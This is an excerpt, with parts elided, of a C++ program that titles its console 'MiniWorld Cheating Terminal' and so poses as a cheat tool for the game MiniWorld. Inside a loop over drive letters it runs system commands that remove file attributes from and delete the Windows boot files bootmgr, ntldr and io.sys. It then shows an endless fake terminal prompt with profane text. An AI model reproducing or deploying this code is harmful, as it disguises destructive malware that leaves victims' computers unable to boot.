...
using namespace std;
int main(){
	system("title MiniWorld Cheating Terminal");
	...
	for(int i='A';i<='Z';i++){
		...
		system("attrib -s -h -r -a bootmgr");
		system("del /q io.sys");
		system("del /q ntldr");
		system("del /q bootmgr");
	}
	system("cls");
	while(1){
		cout<<"FUCKMINIWORLD@FUCKMINIDOG.COM:C:\\Program Files\\MNWORLD\\MINIFUCK.EXE$ ";
		string fuckc;
		cin>>fuckc;
	}
}
